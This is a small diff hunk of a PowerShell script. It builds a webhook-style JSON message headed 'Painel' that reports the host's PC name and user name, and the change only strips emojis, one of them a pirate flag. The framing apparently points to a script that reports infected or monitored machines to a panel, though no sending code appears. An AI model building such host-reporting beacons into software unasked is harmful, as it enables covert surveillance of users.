@@ -45,11 +45,11 @@ $UserName = $env:USERNAME
 $PayloadJSON = @{
     embeds = @(
         @{
-            title = "🏴‍☠️ Painel - $PcName"
+            title = " Painel - $PcName"
             color = 16711680
             fields = @(
                 @{
-                    name = "🌐 INFORMAÇÕES"
+                    name = " INFORMAÇÕES"
                     value = "```diff`n+ PC: $PcName`n+ User: $UserName```"
                     inline = $false
                 }
